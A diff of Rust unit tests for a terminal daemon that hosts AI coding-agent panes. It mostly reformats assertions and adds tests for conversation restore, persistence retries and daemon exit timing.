-    assert!(saved.allows(&std::env::temp_dir()) && !saved.allows(&other), "{saved:?}");
+    assert!(
+        saved.allows(&std::env::temp_dir()) && !saved.allows(&other),
+        "{saved:?}"
+    );
     let (mut again, _rx2) = daemon();
     again.helper_projects = saved;
     let (_, mut c2) = agent_pane_in(&mut again, 1, &std::env::temp_dir());
-    assert!(helper_start(&mut again, 1, &mut c2, None).is_none(), "remembered after a restart");
+    assert!(
+        helper_start(&mut again, 1, &mut c2, None).is_none(),
+        "remembered after a restart"
+    );
     let all: Vec<TermId> = again.terms.keys().copied().collect();
     close(&mut again, &all);
     let all: Vec<TermId> = d.terms.keys().copied().collect();
@@ -3242,7 +6024,10 @@ fn the_setting_decides_always_lets_it_through_never_refuses_and_nothing_is_asked
     let panes = d.terms.len();
     d.cfg.sessions.helpers = "never".into();
     let why = helper_start(&mut d, 1, &mut c, Some("claude 'one'")).expect("refused");
-    assert!(why.contains("turned helpers off") && why.contains("Do the work yourself"), "{why}");
+    assert!(
+        why.contains("turned helpers off") && why.contains("Do the work yourself"),
+        "{why}"
+    );
     assert!(d.terms[&a].helpers.asked.is_empty() && d.terms.len() == panes);
     d.cfg.sessions.helpers = "always".into();
     assert!(helper_start(&mut d, 1, &mut c, None).is_none());
@@ -3261,11 +6046,18 @@ fn an_asking_session_alerts_you_once_even_though_its_own_status_is_not_blocked()
     let (a, mut c) = agent_pane_in(&mut d, 1, &std::env::temp_dir());
     d.set_status(a, Status::Working, "test");
     helper_start(&mut d, 1, &mut c, Some("claude 'one'"));
-    assert_eq!(d.terms[&a].alert_due.map(|(s, _)| s), Some(Status::Blocked), "the desktop alert is queued");
+    assert_eq!(
+        d.terms[&a].alert_due.map(|(s, _)| s),
+        Some(Status::Blocked),
+        "the desktop alert is queued"
+    );
     helper_start(&mut d, 1, &mut c, Some("claude 'two'"));
     let first = d.terms[&a].alert_due;
     helper_start(&mut d, 1, &mut c, Some("claude 'three'"));
-    assert_eq!(d.terms[&a].alert_due, first, "asking again doesn't ring again");
+    assert_eq!(
+        d.terms[&a].alert_due, first,
+        "asking again doesn't ring again"
+    );
     close(&mut d, &[a]);
 }
 
@@ -3277,8 +6069,14 @@ fn the_activity_a_newer_app_reads_counts_working_and_waiting_sessions() {
     d.terms.get_mut(&b).unwrap().status = Status::Blocked;
     d.terms.get_mut(&c).unwrap().status = Status::Idle;
     let seen = d.activity();
-    assert_eq!((seen.sessions, seen.working, seen.waiting, seen.busy()), (3, 1, 1, 2));
-    assert_eq!((seen.pid, seen.version.as_str()), (std::process::id(), env!("CARGO_PKG_VERSION")));
+    assert_eq!(
+        (seen.sessions, seen.working, seen.waiting, seen.busy()),
+        (3, 1, 1, 2)
+    );
+    assert_eq!(
+        (seen.pid, seen.version.as_str()),
+        (std::process::id(), env!("CARGO_PKG_VERSION"))
+    );
     close(&mut d, &[a, b, c]);
 }
 
@@ -3287,17 +6085,28 @@ fn an_agent_saved_mid_turn_comes_back_as_a_resume_of_its_conversation() {
     let (d, _rx) = daemon();
     // What the file holds when the server stops for an update: the agent and its session,
     // whatever it was doing (status is not saved, so a turn in flight resumes, not repeats).
-    let text = serde_json::to_string(&persist::SavedPane { agent: Some("claude".into()), session: Some("abc123".into()), cmd: Some("claude \"do the thing\"".into()), ..Default::default() }).unwrap();
+    let text = serde_json::to_string(&persist::SavedPane {
+        agent: Some("claude".into()),
+        session: Some("abc123".into()),
+        cmd: Some("claude \"do the thing\"".into()),
+        ..Default::default()
+    })
+    .unwrap();
     let pane: persist::SavedPane = serde_json::from_str(&text).unwrap();
     let resume = d.restore_cmd(&pane).expect("claude resumes");
-    assert!(resume.contains("abc123") && !resume.contains("do the thing"), "{resume}");
+    assert!(
+        resume.contains("abc123") && !resume.contains("do the thing"),
+        "{resume}"
+    );
 }
 
 /// A hooked agent left working, its last output and hook report `secs` ago.
 fn silent_working_agent(d: &mut Daemon, secs: u64) -> TermId {
     let id = pane(d);
     d.hook(id, "claude".into(), HookStatus::Working, "PreToolUse", &[]);
-    let ago = Instant::now().checked_sub(Duration::from_secs(secs)).expect("the clock reaches back that far");
+    let ago = Instant::now()
+        .checked_sub(Duration::from_secs(secs))
+        .expect("the clock reaches back that far");
     let t = d.terms.get_mut(&id).unwrap();
     t.last_output = ago;
     t.last_hook_at = Some(ago);
@@ -3310,13 +6119,24 @@ fn a_working_agent_silent_for_ten_minutes_is_quiet() {
     let early = silent_working_agent(&mut d, 9 * 60);
     let late = silent_working_agent(&mut d, 11 * 60);
     d.update_statuses();
-    let (early_quiet, late_quiet, late_status) = (d.terms[&early].quiet_since, d.terms[&late].quiet_since, d.terms[&late].status);
+    let (early_quiet, late_quiet, late_status) = (
+        d.terms[&early].quiet_since,
+        d.terms[&late].quiet_since,
+        d.terms[&late].status,
+    );
     let wire = d.snapshot().terms[&late].quiet_since;
     close(&mut d, &[early, late]);
     assert_eq!(early_quiet, None, "nine minutes is not yet quiet");
     let since = late_quiet.expect("eleven silent minutes is quiet");
-    assert!(term::unix_now().saturating_sub(since) >= 11 * 60, "quiet since its last sign of life");
-    assert_eq!(late_status, Status::Working, "quiet never changes the status");
+    assert!(
+        term::unix_now().saturating_sub(since) >= 11 * 60,
+        "quiet since its last sign of life"
+    );
+    assert_eq!(
+        late_status,
+        Status::Working,
+        "quiet never changes the status"
+    );
     assert_eq!(wire, late_quiet, "clients see it");
 }
 
@@ -3328,9 +6148,18 @@ fn quiet_clears_on_output_or_a_hook() {
     d.update_statuses();
     assert!(d.terms[&printed].quiet_since.is_some() && d.terms[&reported].quiet_since.is_some());
     d.terms.get_mut(&printed).unwrap().last_output = Instant::now();
-    d.hook(reported, "claude".into(), HookStatus::Working, "PostToolUse", &[]);
+    d.hook(
+        reported,
+        "claude".into(),
+        HookStatus::Working,
+        "PostToolUse",
+        &[],
+    );
     d.update_statuses();
-    let after = (d.terms[&printed].quiet_since, d.terms[&reported].quiet_since);
+    let after = (
+        d.terms[&printed].quiet_since,
+        d.terms[&reported].quiet_since,
+    );
     close(&mut d, &[printed, reported]);
     assert_eq!(after, (None, None));
 }
@@ -3345,7 +6174,10 @@ fn helpers_running_or_a_finished_turn_is_never_quiet() {
     let finished = silent_working_agent(&mut d, 11 * 60);
     d.terms.get_mut(&finished).unwrap().status = Status::Done;
     d.update_statuses();
-    let quiet = (d.terms[&waiting].quiet_since, d.terms[&finished].quiet_since);
+    let quiet = (
+        d.terms[&waiting].quiet_since,
+        d.terms[&finished].quiet_since,
+    );
     close(&mut d, &[waiting, finished]);
     assert_eq!(quiet, (None, None));
 }
@@ -3356,21 +6188,42 @@ fn going_quiet_rings_no_alert() {
     let id = silent_working_agent(&mut d, 11 * 60);
     d.terms.get_mut(&id).unwrap().alert_due = None;
     d.update_statuses();
-    let (quiet, due, alerted) = (d.terms[&id].quiet_since, d.terms[&id].alert_due, d.terms[&id].alerted);
+    let (quiet, due, alerted) = (
+        d.terms[&id].quiet_since,
+        d.terms[&id].alert_due,
+        d.terms[&id].alerted,
+    );
     close(&mut d, &[id]);
     assert!(quiet.is_some());
-    assert_eq!((due, alerted.map(|a| a.0)), (None, None), "quiet is shown, never rung");
+    assert_eq!(
+        (due, alerted.map(|a| a.0)),
+        (None, None),
+        "quiet is shown, never rung"
+    );
 }
 
 #[test]
 fn with_output_off_nothing_is_saved_and_what_was_saved_goes() {
-    let _one_at_a_time = SAVED_OUTPUT.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+    let _one_at_a_time = SAVED_OUTPUT
+        .lock()
+        .unwrap_or_else(std::sync::PoisonError::into_inner);
     let (mut d, _rx) = daemon();
     d.cfg.restore.enabled = true;
-    d.command(0, Command::NewWorkspace { cwd: Some(std::env::temp_dir()), name: None, cmd: None }).unwrap();
+    d.command(
+        0,
+        Command::NewWorkspace {
+            cwd: Some(std::env::temp_dir()),
+            name: None,
+            cmd: None,
+        },
+    )
+    .unwrap();
     let t = *d.terms.keys().next().unwrap();
     let file = persist::output_dir().join(format!("{t}.bin"));
-    d.terms.get_mut(&t).unwrap().ring_push_for_test(b"secret=hunter2\r\n");
+    d.terms
+        .get_mut(&t)
+        .unwrap()
+        .ring_push_for_test(b"secret=hunter2\r\n");
     d.save_outputs(true);
     assert!(file.exists(), "on: saved");
     d.cfg.restore.output = false;
@@ -3387,17 +6240,46 @@ fn with_output_off_nothing_is_saved_and_what_was_saved_goes() {
     let replay = String::from_utf8_lossy(&d2.terms[&new].replay()).into_owned();
     close(&mut d, &[t]);
     close(&mut d2, &[new]);
-    assert!(!replay.contains(concat!(env!("APP_COMMAND"), " restarted here")) && !replay.contains("hunter2"), "{replay}");
+    assert!(
+        !replay.contains(concat!(env!("APP_COMMAND"), " restarted here"))
+            && !replay.contains("hunter2"),
+        "{replay}"
+    );
 }
 
 /// One saved workspace with a Claude pane, restored without starting Claude.
 fn restored_claude_pane(d: &mut Daemon) -> TermId {
     d.cfg.restore.agents = false;
     let dir = std::env::temp_dir();
-    let pane = persist::SavedPane { cwd: Some(dir.clone()), agent: Some("claude".into()), session: Some("abc123".into()), ..Default::default() };
-    let tab = persist::SavedTab { name: String::new(), layout: crate::layout::Node::Leaf(1), focus: 1, panes: [(1, pane)].into() };
-    let ws = persist::SavedWs { name: "w".into(), cwd: dir, worktree: false, color: None, group: None, tabs: vec![tab], active_tab: 0 };
-    d.restore(persist::Saved { workspaces: vec![ws], active: 0, made_worktrees: Vec::new() });
+    let pane = persist::SavedPane {
+        cwd: Some(dir.clone()),
+        agent: Some("claude".into()),
+        session: Some("abc123".into()),
+        ..Default::default()
+    };
+    let tab = persist::SavedTab {
+        name: String::new(),
+        layout: crate::layout::Node::Leaf(1),
+        focus: 1,
+        panes: [(1, pane)].into(),
+    };
+    let ws = persist::SavedWs {
+        name: "w".into(),
+        cwd: dir,
+        worktree: false,
+        color: None,
+        group: None,
+        tabs: vec![tab],
+        active_tab: 0,
+    };
+    d.restore(persist::Saved {
+        workspaces: vec![ws],
+        active: 0,
+        made_worktrees: Vec::new(),
+        conversations: Vec::new(),
+        pending_starts: Vec::new(),
+        conversation_operations: Vec::new(),
+    });
     d.workspaces[0].tabs[0].focus
 }
 
@@ -3405,15 +6287,24 @@ fn restored_claude_pane(d: &mut Daemon) -> TermId {
 fn an_agent_that_quits_stays_saved_until_the_server_outlives_the_hold() {
     let (mut d, _rx) = daemon();
     let id = restored_claude_pane(&mut d);
-    d.persist(false);
-    assert!(d.last_saved.contains("abc123"), "saved as a Claude conversation");
+    d.persist_with(false, |_| Ok(()));
+    let initially_saved = d.last_saved.contains("abc123");
     d.hook(id, "claude".into(), HookStatus::Gone, "SessionEnd", &[]);
-    d.persist(false);
-    assert!(d.last_saved.contains("abc123"), "a shutdown kills agents first: the save still resumes it");
+    d.persist_with(false, |_| Ok(()));
+    let retained_during_hold = d.last_saved.contains("abc123");
     d.last_loss = Some(Instant::now() - LOSS_HOLD - Duration::from_secs(1));
-    d.persist(false);
-    assert!(!d.last_saved.contains("abc123"), "still running after the hold: you quit it, so it's saved as a shell");
+    d.persist_with(false, |_| Ok(()));
+    let expired = !d.last_saved.contains("abc123");
     close(&mut d, &[id]);
+    assert!(initially_saved, "saved as a Claude conversation");
+    assert!(
+        retained_during_hold,
+        "a shutdown kills agents first: the save still resumes it"
+    );
+    assert!(
+        expired,
+        "still running after the hold: you quit it, so it's saved as a shell"
+    );
 }
 
 #[test]
@@ -3421,8 +6312,135 @@ fn the_server_waits_out_the_hold_before_forgetting_sessions() {
     let (mut d, _rx) = daemon();
     let id = restored_claude_pane(&mut d);
     d.handle(Ev::Exited(id));
-    assert!(d.terms.is_empty() && d.had_terms, "the last pane ended on its own");
-    assert!(!d.should_exit(), "a reboot may be killing everything: don't exit and forget yet");
+    assert!(
+        d.terms.is_empty() && d.had_terms,
+        "the last pane ended on its own"
+    );
+    assert!(
+        !d.should_exit(),
+        "a reboot may be killing everything: don't exit and forget yet"
+    );
     d.last_loss = Some(Instant::now() - LOSS_HOLD - Duration::from_secs(1));
     assert!(d.should_exit(), "it was only that pane ending");
+}
+
+#[test]
+fn conversation_restore_fences_writers_without_starting_a_pty() {
+    use crate::conversation::{ConversationId, RecoveryState};
+    for reference in [ConversationId(1), ConversationId(99)] {
+        let (mut d, _rx) = daemon();
+        d.cfg.restore.output = false;
+        let mut record = crate::conversation::tests::conversation();
+        record.state = RecoveryState::Transferring;
+        let pane = persist::SavedPane {
+            conversation_id: Some(reference),
+            agent: Some("codex".into()),
+            cmd: Some("codex resume --last".into()),
+            ..Default::default()
+        };
+        assert_eq!(d.restore_cmd(&pane), None);
+        let tab = persist::SavedTab {
+            name: String::new(),
+            layout: crate::layout::Node::Leaf(1),
+            focus: 1,
+            panes: [(1, pane)].into(),
+        };
+        let ws = persist::SavedWs {
+            name: "synthetic".into(),
+            cwd: std::env::temp_dir(),
+            worktree: false,
+            color: None,
+            group: None,
+            tabs: vec![tab],
+            active_tab: 0,
+        };
+        d.restore(persist::Saved {
+            conversations: vec![record],
+            workspaces: vec![ws],
+            ..Default::default()
+        });
+        assert!(
+            d.terms.is_empty(),
+            "linked panes never start via legacy fallback, including missing refs"
+        );
+        assert_eq!(d.conversations[0].state, RecoveryState::RecoveryRequired);
+        assert_eq!(d.conversations[0].generation, 8);
+        assert_eq!(
+            d.saved().conversations,
+            d.conversations,
+            "structured-only identity survives another save"
+        );
+    }
+}
+
+#[test]
+fn legacy_pane_metadata_does_not_invent_a_verified_binding() {
+    let (mut d, _rx) = daemon();
+    let id = restored_claude_pane(&mut d);
+    assert!(d.conversations.is_empty());
+    assert!(d.saved().conversations.is_empty());
+    assert_eq!(d.terms[&id].conversation_id, None);
+    close(&mut d, &[id]);
+}
+
+#[test]
+fn startup_persists_recovered_generations_before_another_restart() {
+    use crate::conversation::RecoveryState;
+    for state in [RecoveryState::Running, RecoveryState::Transferring] {
+        let dir = persist::scratch_dir();
+        let path = dir.path().join("session.json");
+        let mut record = crate::conversation::tests::conversation();
+        record.state = state;
+        let saved = persist::Saved {
+            conversations: vec![record],
+            ..Default::default()
+        };
+        persist::save_in(&path, &saved).unwrap();
+        let (mut d, _rx) = daemon();
+        d.cfg.restore.enabled = true;
+        d.restore_startup(serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap());
+        let before = d.last_saved.clone();
+        d.persist_with(false, |_| anyhow::bail!("synthetic write failure"));
+        assert_eq!(
+            d.last_saved, before,
+            "failed persistence must remain due for retry"
+        );
+        d.persist_with(false, |saved| persist::save_in(&path, saved));
+        let persisted: persist::Saved =
+            serde_json::from_slice(&std::fs::read(&path).unwrap()).unwrap();
+        assert_eq!(
+            (
+                persisted.conversations[0].generation,
+                persisted.conversations[0].state
+            ),
+            (8, RecoveryState::RecoveryRequired)
+        );
+        let (mut restarted, _rx) = daemon();
+        restarted.restore_startup(persisted);
+        assert_eq!(restarted.conversations[0].generation, 8);
+    }
+}
+
+#[test]
+fn registry_only_sessions_survive_the_unused_daemon_exit_deadline() {
+    let (mut d, _rx) = daemon();
+    d.restore_startup(persist::Saved {
+        conversations: vec![crate::conversation::tests::conversation()],
+        ..Default::default()
+    });
+    d.empty_since = Instant::now() - EXIT_WHEN_UNUSED_FOR - Duration::from_secs(1);
+    assert!(
+        !d.should_exit(),
+        "retained identity is not an unused daemon; empty exit would forget it"
+    );
+    d.had_terms = true;
+    assert!(
+        !d.should_exit(),
+        "closing the last PTY does not discard independent identities"
+    );
+    d.conversations.clear();
+    assert!(
+        d.should_exit(),
+        "ordinary empty daemon exit remains unchanged"
+    );
 }
